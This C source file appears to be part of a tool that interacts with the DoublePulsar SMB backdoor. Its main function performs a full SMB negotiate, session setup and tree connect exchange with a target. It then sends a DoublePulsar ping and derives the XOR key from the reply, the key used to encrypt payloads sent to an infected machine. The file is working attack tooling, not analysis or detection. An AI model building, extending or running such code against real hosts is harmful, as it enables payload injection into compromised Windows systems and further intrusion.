#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

extern SOCKET smb_connect(const char *ip, int port);

static int dp_send_all(SOCKET socket_handle, const uint8_t *data, size_t length)
{
    size_t offset = 0;

    while (offset < length) {
        int chunk = length - offset > (size_t)INT_MAX
            ? INT_MAX
            : (int)(length - offset);
        int sent = send(socket_handle, (const char *)data + offset, chunk, 0);
        if (sent == SOCKET_ERROR || sent == 0) {
            return -1;
        }
        offset += (size_t)sent;
    }

    return 0;
}

static int dp_recv_all(SOCKET socket_handle, uint8_t *data, size_t length)
{
    size_t offset = 0;

    while (offset < length) {
        int chunk = length - offset > (size_t)INT_MAX
            ? INT_MAX
            : (int)(length - offset);
        int received = recv(socket_handle, (char *)data + offset, chunk, 0);
        if (received == SOCKET_ERROR || received == 0) {
            return -1;
        }
        offset += (size_t)received;
    }

    return 0;
}

static int dp_receive_frame(SOCKET socket_handle, uint8_t **frame, size_t *frame_length)
{
    uint8_t header[4];
    size_t payload_length;
    uint8_t *buffer;

    if (dp_recv_all(socket_handle, header, sizeof(header)) != 0) {
        return -1;
    }

    payload_length = ((size_t)(header[1] & 0x01u) << 16) |
                     ((size_t)header[2] << 8) |
                     (size_t)header[3];
    if (payload_length > 0x1ffffu || payload_length > SIZE_MAX - sizeof(header)) {
        return -1;
    }

    buffer = (uint8_t *)malloc(sizeof(header) + payload_length);
    if (buffer == NULL) {
        return -1;
    }

    memcpy(buffer, header, sizeof(header));
    if (payload_length != 0 &&
        dp_recv_all(socket_handle, buffer + sizeof(header), payload_length) != 0) {
        free(buffer);
        return -1;
    }

    *frame = buffer;
    *frame_length = sizeof(header) + payload_length;
    return 0;
}

static int dp_exchange(SOCKET socket_handle, const uint8_t *packet, size_t packet_length,
                       uint8_t **response, size_t *response_length)
{
    if (dp_send_all(socket_handle, packet, packet_length) != 0) {
        return -1;
    }
    return dp_receive_frame(socket_handle, response, response_length);
}

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    SOCKET socket_handle = INVALID_SOCKET;
    uint8_t *negotiate_packet = NULL;
    uint8_t *session_setup_packet = NULL;
    uint8_t *tree_connect_packet = NULL;
    uint8_t *ping_packet = NULL;
    uint8_t *response = NULL;
    size_t response_length = 0;
    size_t negotiate_length = sizeof(SMB_NEGOTIATE_PKT) - 1;
    size_t session_setup_length = sizeof(SMB_SESSION_SETUP_PKT) - 1;
    size_t tree_connect_length = sizeof(SMB_TREE_CONNECT_PKT) - 1;
    size_t ping_length = sizeof(DP_PING_PKT) - 1;
    size_t signature_start = (size_t)SMB_RESP_SIGNATURE_START;
    size_t signature_end = (size_t)SMB_RESP_SIGNATURE_END;
    unsigned int result = 0;

    if (ip == NULL || port <= 0 || port > 65535 ||
        signature_end < signature_start ||
        (signature_end - signature_start != 3 &&
         signature_end - signature_start != 4)) {
        return 0;
    }

    negotiate_packet = (uint8_t *)malloc(negotiate_length);
    session_setup_packet = (uint8_t *)malloc(session_setup_length);
    tree_connect_packet = (uint8_t *)malloc(tree_connect_length);
    ping_packet = (uint8_t *)malloc(ping_length);
    if (negotiate_packet == NULL || session_setup_packet == NULL ||
        tree_connect_packet == NULL || ping_packet == NULL) {
        goto cleanup;
    }

    memcpy(negotiate_packet, SMB_NEGOTIATE_PKT, negotiate_length);
    memcpy(session_setup_packet, SMB_SESSION_SETUP_PKT, session_setup_length);
    memcpy(tree_connect_packet, SMB_TREE_CONNECT_PKT, tree_connect_length);
    memcpy(ping_packet, DP_PING_PKT, ping_length);

    if (session_setup_length < 34 || tree_connect_length < 34 ||
        ping_length < 34) {
        goto cleanup;
    }

    socket_handle = smb_connect(ip, port);
    if (socket_handle == INVALID_SOCKET) {
        goto cleanup;
    }

    if (dp_exchange(socket_handle, negotiate_packet, negotiate_length,
                    &response, &response_length) != 0) {
        goto cleanup;
    }
    free(response);
    response = NULL;

    if (dp_exchange(socket_handle, session_setup_packet, session_setup_length,
                    &response, &response_length) != 0) {
        goto cleanup;
    }
    if (response_length < 34) {
        goto cleanup;
    }
    tree_connect_packet[32] = response[32];
    tree_connect_packet[33] = response[33];
    free(response);
    response = NULL;

    if (dp_exchange(socket_handle, tree_connect_packet, tree_connect_length,
                    &response, &response_length) != 0) {
        goto cleanup;
    }
    if (response_length < 34) {
        goto cleanup;
    }
    ping_packet[28] = response[28];
    ping_packet[29] = response[29];
    ping_packet[32] = response[32];
    ping_packet[33] = response[33];
    free(response);
    response = NULL;

    if (dp_exchange(socket_handle, ping_packet, ping_length,
                    &response, &response_length) != 0) {
        goto cleanup;
    }

    if (signature_end - signature_start == 4) {
        if (signature_end > response_length) {
            goto cleanup;
        }
    } else {
        if (signature_end >= response_length) {
            goto cleanup;
        }
        ++signature_end;
    }

    if (signature_end > response_length || signature_end - signature_start != 4) {
        goto cleanup;
    }

    result = (unsigned int)response[signature_start] |
             ((unsigned int)response[signature_start + 1] << 8) |
             ((unsigned int)response[signature_start + 2] << 16) |
             ((unsigned int)response[signature_start + 3] << 24);

cleanup:
    free(response);
    free(negotiate_packet);
    free(session_setup_packet);
    free(tree_connect_packet);
    free(ping_packet);
    if (socket_handle != INVALID_SOCKET) {
        closesocket(socket_handle);
    }
    return result;
}